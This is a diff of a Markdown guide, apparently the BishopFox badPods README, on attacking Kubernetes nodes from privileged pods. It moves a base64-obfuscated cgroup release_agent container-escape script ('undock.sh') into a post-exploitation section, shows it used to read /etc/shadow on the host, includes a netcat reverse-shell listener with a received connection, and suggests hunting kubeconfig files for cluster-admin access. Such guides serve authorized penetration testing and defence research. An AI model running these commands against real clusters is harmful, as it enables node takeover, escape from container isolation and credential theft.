@@ -39,18 +39,6 @@ kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/p
 ```bash
 kubectl -n [namespace] exec -it pod-priv-only -- bash
 ```
-#### Create undock script that will automate the container escape POC
-```bash
-echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > undock.sh 
-```
-Reference(s): 
-* https://twitter.com/_fel1x/status/1151487051986087936
-* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 
-
-#### Then use the script to run whatever commands you want on the host: 
-```bash
-sh undock.sh "cat /etc/shadow"
-```
 
 ### Or, create a reverse shell pod
 [pod-priv-only-revshell.yaml](pod-priv-only-revshell.yaml)
@@ -72,12 +60,28 @@ envsubst < ./yaml/priv-and-hostpid/pod-priv-only-revshell.yaml | kubectl apply -
 ~ nc -nvlp 3116
 Listening on 0.0.0.0 3116
 Connection received on 10.0.0.162 42035
-~ chroot /host
 ```
+
+
+
+
 
 # Post exploitation
 
-You now have root access to the node. Here are some next steps: 
+#### Create undock script that will automate the container escape POC
+```bash
+echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > undock.sh 
+```
+Reference(s): 
+* https://twitter.com/_fel1x/status/1151487051986087936
+* https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/ 
+
+#### Then use the script to run whatever commands you want on the host: 
+```bash
+sh undock.sh "cat /etc/shadow"
+```
+
+
 
 #### Look for kubeconfig's in the host filesystem 
 If you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)
